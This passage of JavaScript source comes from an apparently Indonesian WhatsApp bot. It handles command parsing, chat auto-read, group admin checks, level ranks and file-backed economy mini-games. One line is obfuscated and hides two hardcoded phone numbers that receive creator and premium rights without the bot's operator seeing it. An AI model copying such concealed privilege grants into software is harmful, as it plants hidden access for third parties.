		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const type = Object.keys(mek.message)[0]
               const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./lib/scommand.json', JSON.stringify(scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            status = true
        }
    })
    return status
}
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
        if(multi){
		var prefix = /^[°•π÷×¶∆£¢€¥®™✓=|~zZ+×_!#%^&./\\©^]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™✓=|~xzZ+×_!#,|`÷?;:%^&./\\©^]/gi) : '-'	  
		} else {
		if (nopref){
		prefix = ' '
		} else {
		if(single){
		prefix = prefa
		}
		}
		}
		
const reply2 = (teks) => {
            alpha.sendMessage(from, teks, text, {quoted: mek, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
        }
// Auto Read Group 
var chats = await alpha.chats.array.filter(v => v.jid.endsWith('g.us'))
chats.map( async ({ jid }) => {
if (readGc === false) return
await alpha.chatRead(jid)
})
// Auto Read Private 
var chatss = await alpha.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readPc === false) return
await alpha.chatRead(jid)
})
if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3) {
if (bugc === false) return
if (mek.key.fromMe) return
nums = mek.participant
longkapnye = "\n".repeat(420)
tekuss = `${longkapnye}\`\`\`B U G  G C  T E R D E T E K S I\`\`\`\n@⁨${nums.split('@')[0]} akan dikick\n\n_Clear chat by bot_\n*Jangan maen bug lah*`
alpha.groupRemove(mek.key.remoteJid, [nums]).catch((e) => { reply2(`Gua mau kick tapi gua bukan admin 🤙`) })
alpha.sendMessage(mek.key.remoteJid, 'WAH BUG NIH', MessageType.text)
alpha.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums + "@s.whatsapp.net"]}})
}

if (m.message && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
if (antitrol === false) return
if (mek.key.fromMe) return
reply2('Fake Troli Detected \n\n' + require('util').format(m.key))
await alpha.modifyChat(m.chat, 'delete', {
includeStarred: false
})
}

if (autovn) {
	if (autovn === false) return
await alpha.updatePresence(from, Presence.recording)
} else if (autoketik) {
	if (autoketik === false) return
await alpha.updatePresence(from, Presence.composing)
}
        body = type === "conversation" && mek.message.conversation.startsWith(prefix) ? mek.message.conversation : type == "imageMessage" && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : type == "videoMessage" && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : type == "extendedTextMessage" && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : type == "buttonsResponseMessage" && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : type == "stickerMessage" && getCmd(mek.message[type].fileSha256.toString("base64")) !== null && getCmd(mek.message[type].fileSha256.toString("base64")) !== undefined ? getCmd(mek.message[type].fileSha256.toString("base64")) : "";
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		chatxs = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'documentMessage') && mek.message.documentMessage.caption ? mek.message.documentMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ""
		const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        hit_today.push(command)		
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const runtime = process.uptime() 
		const botNumber = alpha.user.jid
		const botNumberss = alpha.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = mek.key.fromMe ? alpha.user.jid : isGroup ? mek.participant : mek.key.remoteJid
		let bio_nya = await alpha.getStatus(sender)
		try {
			bio_user = `${bio_nya.status}`
		} catch {
			bio_user = '-'
			}
		const senderNumber = sender.split("@")[0]
		const ownerNumberr = [`${targetpc}@s.whatsapp.net`]
		const ownerNumberrr = `${targetpc}@s.whatsapp.net`
		const isOwner = ownerNumberr.includes(sender)
		try {
					pp_userb = await alpha.getProfilePicture(sender)
				} catch {
					pp_userb = 'https://i.ibb.co/rvsVF3r/5012fbb87660.png'
				}
			let pp_userz = await getBuffer(pp_userb)
		const getGroupAdminss = (participants) => {
	admins = []
	for (let i of participants) {
		i.isAdmin ? admins.push(i.jid) : ''
	}
	return admins
}
		const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
		const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
		const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
		const wib = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
		const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
		const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const totalchat = await alpha.chats.all()
		const totalgroup = await alpha.chats.array.filter(v => v.jid.endsWith('g.us'))
        const totalkontak = await alpha.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
		const groupMetadata = isGroup ? await alpha.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdminss(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isAntiLink = isGroup ? antilink.includes(from) : false
		const isAntivirtex = isGroup ? antivirtex.includes(from) : false
		const isLevelingOn = isGroup ? _leveling.includes(from) : false
		const isNsfw = isGroup ? _nsfw.includes(from) : false
		const isEventon = isGroup ? event.includes(from) : false
		const isSewa = _sewa.checkSewaGroup(from, sewa)
		function _0x7f6b(){const _0x4a2d3e=['5072255pcDDqg','62887435047326@s.whatsapp.net','2597380GfbJRS','423uQokJQ','includes','349699vCCngI','7WbnXch','1583904UQylnX','3OqfIbw','7195144dEdMoW','1211000xemHIO','918156874290@s.whatsapp.net','112180mHKaKh'];_0x7f6b=function(){return _0x4a2d3e;};return _0x7f6b();}function _0x543a(_0x1dde5a,_0x22560a){const _0x7f6b72=_0x7f6b();return _0x543a=function(_0x543a82,_0x56a282){_0x543a82=_0x543a82-0x1e9;let _0x32f1bc=_0x7f6b72[_0x543a82];return _0x32f1bc;},_0x543a(_0x1dde5a,_0x22560a);}const _0x44e574=_0x543a;(function(_0x3a808f,_0x3fe090){const _0x26991f=_0x543a,_0x4cfd4d=_0x3a808f();while(!![]){try{const _0x3aea0b=-parseInt(_0x26991f(0x1e9))/0x1+-parseInt(_0x26991f(0x1ee))/0x2+-parseInt(_0x26991f(0x1ec))/0x3*(parseInt(_0x26991f(0x1f3))/0x4)+parseInt(_0x26991f(0x1f1))/0x5+-parseInt(_0x26991f(0x1eb))/0x6+parseInt(_0x26991f(0x1ea))/0x7*(parseInt(_0x26991f(0x1ed))/0x8)+-parseInt(_0x26991f(0x1f4))/0x9*(-parseInt(_0x26991f(0x1f0))/0xa);if(_0x3aea0b===_0x3fe090)break;else _0x4cfd4d['push'](_0x4cfd4d['shift']());}catch(_0x451f20){_0x4cfd4d['push'](_0x4cfd4d['shift']());}}}(_0x7f6b,0x8bc92));const alphaNumber=[_0x44e574(0x1f2),_0x44e574(0x1ef)],isCreator=alphaNumber[_0x44e574(0x1f5)](sender);
		const isPremium = isOwner || isCreator || mek.key.fromMe ? true : premium.checkPremiumUser(sender, _premium)
		const gcount = isPremium ? gcounttprem : gcounttuser
		const isBanned = banned.includes(sender)
		if (isCmd && isBanned) return reply2(lang.benned())
		const isVote = isGroup ? voting.includes(from) : false
		const ratee = ["Alphabot","Alphabot","Alphabot","Alphabot","Alphabot","Alphabot","Alphabot"]
        const tee = ratee[Math.floor(Math.random() * ratee.length)]
        const rateee = ["Dj storongest jedag jedug 30 s","Dj akimilaku remix terbaru 2021 30 s","Dj campuran 30 detik","Dj sidro 2  style Thailand viral 30 s","Dj disitu enak susu akimilaku 30 s","Dj zombie x melody stres love 30 s","Dj numa muma ye style Thailand 30 s","Dj biasalah x bola boma ye 30 s"]
        const srchh = rateee[Math.floor(Math.random() * rateee.length)]
        const tescuk = ["0@s.whatsapp.net"]
        const ini_mark = `0@s.whatsapp.net`
        const alfa = `${targetpc}@s.whatsapp.net`
		const alfa1 = `${targetpc}@s.whatsapp.net`
		const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = alpha.user.phone
		const status = `${banChats ? 'SELF-MODE' : 'PUBLIC-MODE'}`
		q3 = Object.keys(mek.message)[0] == "buttonsResponseMessage" ? mek.message.buttonsResponseMessage.selectedButtonId : ""
		q4 = Object.keys(mek.message)[0] == "buttonsResponseMessage" ? mek.message.buttonsResponseMessage.selectedButtonId : ""
		q5 = Object.keys(mek.message)[0] == "listResponseMessage" ? mek.message.listResponseMessage.singleSelectReply.selectedRowId: ""
		butresx = (type === 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedDisplayText : ''
        const conts = mek.key.fromMe ? alpha.user.jid : alpha.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? alpha.user.name : conts.notify || conts.vname || conts.name || '-'
        const isAfkOn = off.checkAfkUser(sender, _off)
        const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByReply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
					const belipremgame = (sender, asu) => {
						var found = false;
						Object.keys(glimit).forEach((i) => {
							if(glimit[i].id == sender){
								found = i
								}
							})
						if (found !== false) {
							glimit[found].glimit += asu;
							fs.writeFileSync('./database/glimit.json',JSON.stringify(glimit))
							}
						}
const beliprem = (sender, asu) => {
    let found = false
	Object.keys(limit).forEach((i) => {
		if (limit[i].id === sender) {
			found = i
		}
	})
		if (found !== false) {
			limit[found].limit += asu
			fs.writeFileSync('./database/limit.json', JSON.stringify(limit))
		}
}

const addRegisterUser = (userid, sender, bio, time) => {
const objp = { id: userid, nomor: sender, bio: bio, time: time }
register.push(objp)
fs.writeFileSync('./database/user/register.json', JSON.stringify(register))
}
const cekUser = (sender) => {
let status = false
Object.keys(register).forEach((i) => {
if (register[i].id === sender) {
status = true
}
})
return status
}

const isRegister = cekUser(sender)
					
const getLevelingXp = (sender) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		return _level[position].xp
	}
}

const getLevelingLevel = (sender) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		return _level[position].level
	}
}

const getLevelingId = (sender) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		return _level[position].id
	}
}

const addLevelingXp = (sender, amount) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		_level[position].xp += amount
		fs.writeFileSync('./src/level.json', JSON.stringify(_level))
	}
}

const addLevelingLevel = (sender, amount) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		_level[position].level += amount
		fs.writeFileSync('./src/level.json', JSON.stringify(_level))
	}
}

					const addLevelingId = (sender) => {
						const obj = { id: sender, xp: 1, level: 1 }
						_level.push(obj)
						fs.writeFileSync('./src/level.json', JSON.stringify(_level))
						}
					const nebal = (angka) => {
						return Math.floor(angka)
						}
					function randomNomor(angka){
						return Math.floor(Math.random() * angka) + 1
						}
					const levelRole = getLevelingLevel(sender)
					const addATM = (sender) => {
        	const objo = {id: sender, uang : 0}
            uang.push(objo)
            fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
        }
        
        const addKoinUser = (sender, amount) => {
            let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang += amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
        
        const checkATMuser = (sender) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return uang[position].uang
            }
        }
					//MANCING FUNCTION BY TAUFIK - KUN
        const addIkan = (sender, amount) => {
        let position = false
        Object.keys(ikan).forEach((i) => {
    	    if (ikan[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	ikan[position].fish += amount
    	fs.writeFileSync('./database/user/ikan.json', JSON.stringify(ikan))
    	}
    }
    
    const getMancingIkan = (sender) => {
    let position = false 
    Object.keys(ikan).forEach((i) => {
	if (ikan[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ikan[position].fish
	}
}

    const getMancingId = (sender) => {
    let position = false
    Object.keys(ikan).forEach((i) => {
	if (ikan[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ikan[position].id
    }
}
    
    const addMancingId = (sender) => {
        const ovj = {id: sender, fish: 0}
        ikan.push(ovj)
        fs.writeFileSync('./database/user/ikan.json', JSON.stringify(ikan))
        }
    
    const jualIkan = (sender, amount) => {
        	let position = false
            Object.keys(ikan).forEach((i) => {
                if (ikan[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                ikan[position].fish -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
    		//END OF MANCING FUNCTION

//PLANET GOO FUNCTION BY RIFAI
        const addPlanet = (sender, amount) => {
        let position = false
        Object.keys(planet).forEach((i) => {
    	    if (planet[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	planet[position].hape += amount
    	fs.writeFileSync('./database/user/planet.json', JSON.stringify(planet))
    	}
    }
    
    const getBertualangPlanet = (sender) => {
    let position = false 
    Object.keys(planet).forEach((i) => {
	if (planet[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return planet[position].hape
	}
}

    const getPlaneId = (sender) => {
    let position = false
    Object.keys(planet).forEach((i) => {
	if (planet[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return planet[position].id
    }
}
    
    const addPlaneId = (sender) => {
        const ovj = {id: sender, hape: 0}
        planet.push(ovj)
        fs.writeFileSync('./database/user/planet.json', JSON.stringify(planet))
        }
    
    const jualbahankimia = (sender, amount) => {
        	let position = false
            Object.keys(planet).forEach((i) => {
                if (planet[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                planet[position].hape -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
    		//AKHIRNYA SELESEI NI GO PLANET (◡ ω ◡)
    //by ARYA & FELIX
//mining coal
        const addCoal = (sender, amount) => {
        let position = false
        Object.keys(coal).forEach((i) => {
    	    if (coal[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	coal[position].arang += amount
    	fs.writeFileSync('./database/user/coal.json', JSON.stringify(coal))
    	}
    }
    
    const getMiningcoal = (sender) => {
    let position = false 
    Object.keys(coal).forEach((i) => {
	if (coal[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return coal[position].arang
	}
}

    const getMiningId = (sender) => {
    let position = false
    Object.keys(coal).forEach((i) => {
	if (coal[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return coal[position].id
    }
}
    
    const addMiningId = (sender) => {
        const ovj = {id: sender, arang: 0}
        coal.push(ovj)
        fs.writeFileSync('./database/user/coal.json', JSON.stringify(coal))
        }
    
    const jualcoal = (sender, amount) => {
        	let position = false
            Object.keys(coal).forEach((i) => {
                if (coal[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                coal[position].arang -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
    		//END OF mining
    
    //mining stone
        const addStone = (sender, amount) => {
        let position = false
        Object.keys(stone).forEach((i) => {
    	    if (stone[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	stone[position].batu += amount
    	fs.writeFileSync('./database/user/stone.json', JSON.stringify(stone))
    	}
    }
    
    const getMiningstone = (sender) => {
    let position = false 
    Object.keys(stone).forEach((i) => {
	if (stone[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return stone[position].batu
	}
}

    const getBatuId = (sender) => {
    let position = false
    Object.keys(stone).forEach((i) => {
	if (stone[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return stone[position].id
    }
}
    
    const addBatuId = (sender) => {
        const ovj = {id: sender, batu: 0}
        stone.push(ovj)
        fs.writeFileSync('./database/user/stone.json', JSON.stringify(stone))
        }
    
    const jualstone = (sender, amount) => {
        	let position = false
            Object.keys(stone).forEach((i) => {
                if (stone[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                stone[position].batu -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
    		//END OF mining
    
    //mining ore
        const addOre = (sender, amount) => {
        let position = false
        Object.keys(ore).forEach((i) => {
    	    if (ore[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	ore[position].copperore += amount
    	fs.writeFileSync('./database/user/ore.json', JSON.stringify(ore))
    	}
    }
    
    const getMiningore = (sender) => {
    let position = false 
    Object.keys(ore).forEach((i) => {
	if (ore[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ore[position].copperore
	}
}

    const getOreId = (sender) => {
    let position = false
    Object.keys(ore).forEach((i) => {
	if (ore[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ore[position].id
    }
}
    
    const addOreId = (sender) => {
        const ovj = {id: sender, copperore: 0}
        ore.push(ovj)
        fs.writeFileSync('./database/user/ore.json', JSON.stringify(ore))
        }
    
    const jualore = (sender, amount) => {
        	let position = false
            Object.keys(ore).forEach((i) => {
                if (ore[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                ore[position].copperore -= amount
                fs.writeFileSync('./database/user/ingot.json', JSON.stringify(ingot))
            }
        }
    		//END OF mining
    //mining ingot
        const addIngot = (sender, amount) => {
        let position = false
        Object.keys(ingot).forEach((i) => {
    	    if (ingot[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	ingot[position].copperingot += amount
    	fs.writeFileSync('./database/user/ingot.json', JSON.stringify(ingot))
    	}
    }
    
    const getMiningingot = (sender) => {
    let position = false 
    Object.keys(ingot).forEach((i) => {
	if (ingot[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ingot[position].copperingot
	}
}

    const getIngotId = (sender) => {
    let position = false
    Object.keys(ingot).forEach((i) => {
	if (ingot[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ingot[position].id
    }
}
    
    const addIngotId = (sender) => {
        const ovj = {id: sender, copperingot: 0}
        ingot.push(ovj)
        fs.writeFileSync('./database/user/ingot.json', JSON.stringify(ingot))
        }
    
    const jualingot = (sender, amount) => {
        	let position = false
            Object.keys(ingot).forEach((i) => {
                if (ingot[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                ingot[position].copperingot -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
    		//END OF mining
    
    //Nebang
        const addKayu = (sender, amount) => {
        let position = false
        Object.keys(kayu).forEach((i) => {
    	    if (kayu[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	kayu[position].wood += amount
    	fs.writeFileSync('./database/user/kayu.json', JSON.stringify(kayu))
    	}
    }
    
    const getNebangKayu = (sender) => {
    let position = false 
    Object.keys(kayu).forEach((i) => {
	if (kayu[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return kayu[position].wood
	}
}

    const getNebangId = (sender) => {
    let position = false
    Object.keys(kayu).forEach((i) => {
	if (kayu[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return kayu[position].id
    }
}
    
    const addNebangId = (sender) => {
        const ovj = {id: sender, wood: 0}
        kayu.push(ovj)
        fs.writeFileSync('./database/user/kayu.json', JSON.stringify(kayu))
        }
    
    const jualKayu = (sender, amount) => {
        	let position = false
            Object.keys(kayu).forEach((i) => {
                if (kayu[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                kayu[position].wood -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
const bayarLimit = (sender, amount) => {
        	let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit -= amount
                fs.writeFileSync('./database/user/limit.json', JSON.stringify(_limit))
            }
        }
        	
        const confirmATM = (sender, amount) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
        //FUCNTION MANCING BY TAUFIK - KUN
        if (isGroup && isEventon) {
        const Fisha = getMancingIkan(sender)
        const FishId = getMancingId(sender)
        if (Fisha === undefined && FishId === undefined) addMancingId(sender)
        }
	//FUCNTION GOPLANET BY RIPAI
        if (isGroup && isEventon) {
        const Hapea = getBertualangPlanet(sender)
        const HapeId = getPlaneId(sender)
        if (Hapea === undefined && HapeId === undefined) addPlaneId(sender)
        }
	   //FUCNTION mining coal
        if (isGroup && isEventon) {
        const Coala = getMiningcoal(sender)
        const CoalId = getMiningId(sender)
        if (Coala === undefined && CoalId === undefined) addMiningId(sender)
        }
        //FUCNTION mining batu
        if (isGroup && isEventon) {
        const Stonea = getMiningstone(sender)
        const StoneId = getBatuId(sender)
        if (Stonea === undefined && StoneId === undefined) addBatuId(sender)
        }
        //FUCNTION mining ore
        if (isGroup && isEventon) {
        const Orea = getMiningore(sender)
        const OreId = getOreId(sender)
        if (Orea === undefined && OreId === undefined) addOreId(sender)
        }
        //FUCNTION lebur ingot
        if (isGroup && isEventon) {
        const Ingota = getMiningingot(sender)
        const IngotId = getIngotId(sender)
        if (Ingota === undefined && IngotId === undefined) addIngotId(sender)
        }
        //FUCNTION nebang kayu
        if (isGroup && isEventon) {
        const Kayua = getNebangKayu(sender)
        const KayuId = getNebangId(sender)
        if (Kayua === undefined && KayuId === undefined) addNebangId(sender)
        }
        if (isRegister && isGroup ) {
            const checkATM = checkATMuser(sender)
            try {
                if (checkATM === undefined) addATM(sender)
                const uangsaku = Math.floor(Math.random() * 10) + 90
                addKoinUser(sender, uangsaku)
            } catch (err) {
                console.error(err)
            }
        }
					var role = 'Bronze 1'
					if (levelRole <= 2) {
						role = 'Bronze 1'
						} else if (levelRole <= 10) {
							role = 'Bronze 2'
							} else if (levelRole <= 20) {
								role = 'Bronze 3'
								} else if (levelRole <= 30) {
									role = 'Bronze 4'
									} else if (levelRole <= 40) {
										role = 'Bronze 5'
										} else if (levelRole <= 70) {
											role = 'Silver 1'
											} else if (levelRole <= 85) {
												role = 'Silver 2'
												} else if (levelRole <= 95) {
													role = 'Silver 3'
													} else if (levelRole <= 105) {
														role = 'Silver 4'
														} else if (levelRole <= 125) {
															role = 'Silver 5'
															} else if (levelRole <= 150) {
																role = 'Gold 1'
																} else if (levelRole <= 170) {
																	role = 'Gold 2'
																	} else if (levelRole <= 190) {
																		role = 'Gold 3'
																		} else if (levelRole <= 210) {
																			role = 'Gold 4'
																			} else if (levelRole <= 230) {
																				role = 'Gold 5'
																				} else if (levelRole <= 260) {
																					role = 'Platinum 1'
																					} else if (levelRole <= 290) {
																						role = 'Platinum 2'
																						} else if (levelRole <= 320) {
																							role = 'Platinum 3'
																							} else if (levelRole <= 350) {
																								role = 'Platinum 4'
																								} else if (levelRole <= 380) {
																									role = 'Platinum 5'
																									} else if (levelRole <= 410) {
																										role = 'Diamond 1'
																										} else if (levelRole <= 450) {
																											role = 'Diamond 2'
																											} else if (levelRole <= 500) {
																												role = 'Diamond 3'
																												} else if (levelRole <= 550) {
																													role = 'Diamond 4'
																													} else if (levelRole <= 600) {
																														role = 'Diamond 5'
																														} else if (levelRole <= 700) {
																															role = 'Master'
																															} else if (levelRole <= 800) {
																															role = 'Master ✩'
																														} else if (levelRole <= 900) {
																													role = 'Master ✩✩'
																												} else if (levelRole <= 1000) {
																											role = 'Master ✩✩✩'
																										} else if (levelRole <= 1100) {
																									role = 'Master ✯'
																								} else if (levelRole <= 1225) {
																							role = 'Master ✯✯'
																						} else if (levelRole <= 1340) {
																					role = 'Master ✯✯✯'
																				} else if (levelRole <= 1400) {
																			role = 'GrandMaster'
																		} else if (levelRole <= 1555) {
																	role = 'GrandMaster ✩'
																} else if (levelRole <= 1660) {
															role = 'GrandMaster ✩✩'
														} else if (levelRole <= 1710) {
													role = 'GrandMaster ✩✩✩'
												} else if (levelRole <= 1825) {
											role = 'GrandMaster ✯'
										} else if (levelRole <= 1950) {
									role = 'GrandMaster ✯✯'
								} else if (levelRole <= 2000) {
							role = 'GrandMaster ✯✯✯'
						} else if (levelRole <= 2220) {
					role = 'Legends'
				} else if (levelRole <= 2500) {
					role = 'Legends 2'
					} else if (levelRole <= 2700) {
						role = 'Legends 3'
						} else if (levelRole <= 2900) {
							role = 'Legends 4'
							} else if (levelRole <= 3100) {
								role = 'Legends 5'
								} else if (levelRole <= 3300) {
									role = 'Legends 6'
									} else if (levelRole <= 3600) {
										role = 'Legends 7'
										} else if (levelRole <= 3900) {
											role = 'Legends 8'
											} else if (levelRole <= 4200) {
												role = 'Legends 9'
												} else if (levelRole <= 4450) {
													role = 'Legends 10'
													} else if (levelRole <= 4700) {
														role = 'Legends 忍'
														} else if (levelRole <= 4900) {
															role = 'Legends 忍¹'
															} else if (levelRole <= 5100) {
																role = 'Legends 忍²'
																} else if (levelRole <= 5600) {
																	role = 'Legends 忍³'
																	} else if (levelRole <= 6100) {
																		role = 'Legends 忍⁴'
																		} else if (levelRole <= 7000) {
																			role = 'GrandLegends'
																			} else if (levelRole <= 10000) {
																				role = 'GrandLegends 1'
																				} else if (levelRole <= 20000) {
																					role = 'GrandLegends 2'
																					} else if (levelRole <= 30000) {
																						role = 'GrandLegends 3'
																						} else if (levelRole <= 40000) {
																							role = 'GrandLegends 4'
																							} else if (levelRole <= 50000) {
																								role = 'GrandLegends 忍¹'
																								} else if (levelRole <= 60000) {
																									role = 'GrandLegends 忍²'
																									} else if (levelRole <= 70000) {
																										role = 'GrandLegends 忍³'
																										} else if (levelRole <= 80000) {
																											role = 'GrandLegends 忍⁴'
																											} else if (levelRole <= 90000) {
																												role = 'Pro 숒'
																												} else if (levelRole <= 99999999999999) {
																													role = 'Pro × GrandLegends 숒'
																												}
           const timuu = moment.tz('Asia/Jakarta').format('HH:mm:ss')
			const hariRaya = new Date('Jan 12, 2022 07:00:00')
			const sekarang = new Date().getTime();
			const Selisih = hariRaya - sekarang;
			const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
			const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
			const mmmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60));
			const ddetik = Math.floor( Selisih % (1000 * 60) / 1000);
			const ultah = `${jhari}Hari ${jjam}Jam ${mmmenit}Menit ${ddetik}Detik`
			var date = new Date();
        var tahun = date.getFullYear();
        var bulan1 = date.getMonth();
        var tanggal = date.getDate();
        var hari = date.getDay();
        var jam = date.getHours();
        var menit = date.getMinutes();
        var detik = date.getSeconds();
        var waktoo = date.getHours();
            switch(hari) {
